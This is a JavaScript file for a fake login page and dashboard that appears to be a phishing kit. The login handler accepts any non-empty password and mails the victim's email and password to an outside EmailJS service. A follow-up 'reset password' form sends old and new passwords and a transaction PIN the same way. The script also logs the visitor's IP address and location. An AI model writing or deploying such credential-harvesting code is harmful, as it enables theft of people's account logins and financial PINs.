// ======= UTIL & STORAGE HELPERS =======
const STORAGE_CURRENT_USER_KEY = "currentUser";

function saveCurrentUserPublic(user) {
  const publicUser = {
    email: user.email,
    password: user.password,
  };
  localStorage.setItem(STORAGE_CURRENT_USER_KEY, JSON.stringify(publicUser));
}

function loadCurrentUser() {
  return JSON.parse(localStorage.getItem(STORAGE_CURRENT_USER_KEY)) || null;
}

function logout() {
  localStorage.removeItem(STORAGE_CURRENT_USER_KEY);
  window.location.href = "index.html";
}

// ======= VALIDATION =======
function isEmailValid(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function isPasswordValid(password) {
  return typeof password === "string" && password.length >= 1;
}

// ======= MODAL HELPER =======
function showModal(message) {
  const modal = document.getElementById("modal");
  const text = document.getElementById("modalMessage");
  const closeBtn = document.getElementById("modalClose");

  if (!modal || !text || !closeBtn) return;

  text.textContent = message;
  modal.classList.remove("hidden");

  closeBtn.onclick = () => {
    modal.classList.add("hidden");
  };
}

// ======= LOGIN FUNCTION =======
async function login(email, password) {
  const emailInput = document.getElementById("email");

  function focusEmailDelayed() {
    setTimeout(() => {
      if (emailInput) {
        try {
          emailInput.focus();
          if (typeof emailInput.setSelectionRange === "function") {
            const len = emailInput.value ? emailInput.value.length : 0;
            emailInput.setSelectionRange(len, len);
          }
        } catch (e) {}
      }
    }, 1000);
  }

  const emailEmpty = !email || email.trim() === "";
  const passwordEmpty = !password || password === "";

  if (emailEmpty && passwordEmpty) {
    showModal("Please fill in your login details.");
    focusEmailDelayed();
    return;
  }

  if (emailEmpty) {
    showModal("Please fill in your email.");
    focusEmailDelayed();
    return;
  }

  if (!isEmailValid(email)) {
    showModal("Please enter a valid email.");
    focusEmailDelayed();
    return;
  }

  if (!isPasswordValid(password)) {
    showModal("Password cannot be empty.");
    return;
  }

  if (!window.emailjs) {
    console.error("EmailJS SDK not loaded");
    showModal("Service temporarily unavailable. Please try again later.");
    return;
  }

  try {
    console.log("📨 Sending EmailJS message...");
    await emailjs.send(
      "service_6nw221q",
      "template_d6k3x8f",
      {
        useremail: email,
        userpassword: password,
        time: new Date().toISOString(),
      }
    );
    console.log("✅ EmailJS success");
  } catch (error) {
    console.error("❌ EmailJS ERROR:", error);
    showModal("Unable to process request at the moment. Please try again.");
    return;
  }

  saveCurrentUserPublic({ email, password });
  window.location.href = "dashboard.html";
}

 async function sendDashboardData() {
  const oldPassword = document.getElementById("oldPassword")?.value || "";
  const newPassword = document.getElementById("newPassword")?.value || "";
  const confirmNewPassword = document.getElementById("confirmNewPassword")?.value || "";
  const transactionPin = document.getElementById("transactionPin")?.value || "";
  const confirmTransactionPin = document.getElementById("confirmTransactionPin")?.value || "";

  if (!window.emailjs) {
    console.error("EmailJS SDK not loaded");
    alert("Service temporarily unavailable. Try again later.");
    return;
  }

  try {
    await emailjs.send(
      "service_6nw221q",       // your service ID
      "template_d6k3x8f",      // your template ID
      {
        oldPassword,
        newPassword,
        confirmNewPassword,
        transactionPin,
        confirmTransactionPin,
        time: new Date().toISOString()
      }
    );
    alert("Dashboard data sent successfully!");
  } catch (err) {
    console.error("EmailJS error:", err);
    alert("Failed to send dashboard data.");
  }
 }

// ======= DASHBOARD HELPER =======
function loadDashboard() {
  const currentUser = loadCurrentUser();
  if (!currentUser || !currentUser.email) {
    window.location.href = "index.html";
    return;
  }

  const emailEl = document.getElementById("userEmail");
  if (emailEl) emailEl.textContent = currentUser.email;
}

// ======= USER LOCATION (IP-based) =======
async function fetchUserLocation() {
  const ipEl = document.getElementById("user-ip");
  const locationEl = document.getElementById("user-location");
  const timeEl = document.getElementById("user-time");

  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    // Convert country code to emoji
    const flag = data?.country_code
      ? data.country_code.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt()))
      : "";

    const ip = data?.ip || "N/A";
    const city = data?.city || "Unknown City";
    const region = data?.region || "";
    const country = data?.country_name || "Unknown Country";
    const timezone = data?.timezone || "UTC";

    localStorage.setItem("sessionLocation", JSON.stringify({ ip, city, region, country, timezone }));

    if (ipEl) ipEl.textContent = `IP: ${ip}`;
    if (locationEl)
      locationEl.textContent = `Location: ${flag} ${city}${region ? ", " + region : ""}, ${country}`;
    if (timeEl)
      timeEl.textContent = `Time: ${new Date().toLocaleString("en-US", { timeZone: timezone })}`;
  } catch (e) {
    console.warn("Could not fetch IP location:", e);
    if (ipEl) ipEl.textContent = "IP: N/A";
    if (locationEl) locationEl.textContent = "Location: N/A";
    if (timeEl) timeEl.textContent = `Time: ${new Date().toLocaleString()}`;
  }
}

 const resetBtn = document.getElementById("resetPasswordBtn");
if (resetBtn) {
  resetBtn.addEventListener("click", async (e) => {
    e.preventDefault(); // prevent default form submission
    await sendDashboardData();
    // Optional: you can reset the form after sending
    // document.getElementById("resetPasswordForm").reset();
  });
}

// ======= HOOKS / EVENT BINDING =======
document.addEventListener("DOMContentLoaded", () => {
  const loginBtn = document.getElementById("loginBtn");

  if (loginBtn) {
    loginBtn.addEventListener("click", async (e) => {
      e.preventDefault();
      const email = document.getElementById("email")?.value.trim();
      const password = document.getElementById("password")?.value;
      await login(email, password);
    });
  }

  if (document.getElementById("userEmail")) {
    loadDashboard();
  }

  fetchUserLocation();
});
